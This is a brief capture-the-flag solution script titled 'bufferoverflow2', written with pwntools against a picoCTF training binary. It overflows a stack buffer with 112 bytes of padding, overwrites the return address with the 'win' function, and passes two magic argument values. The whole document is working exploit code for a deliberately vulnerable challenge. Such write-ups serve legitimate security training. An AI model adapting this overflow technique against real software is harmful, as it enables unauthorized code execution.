#### bufferoverflow2



```python 
from pwn import *

context.log_level = 'info'
context.binary = "./vuln"
elf = context.binary
libc = elf.libc
rop = ROP(elf)

def start():
    if args.R:
        return remote("saturn.picoctf.net", 57089)
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            break main
        ''')
    else:
        return process(elf.path)

def exploit(p):
    payload = b"a" * 112
    payload += p32(elf.symbols["win"])
    payload += p32(elf.symbols["main"])
    payload += p32(0xcafef00d)
    payload += p32(0xf00df00d)
    
    p.recvline(b"your string:")
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    io = start()
    exploit(io)
```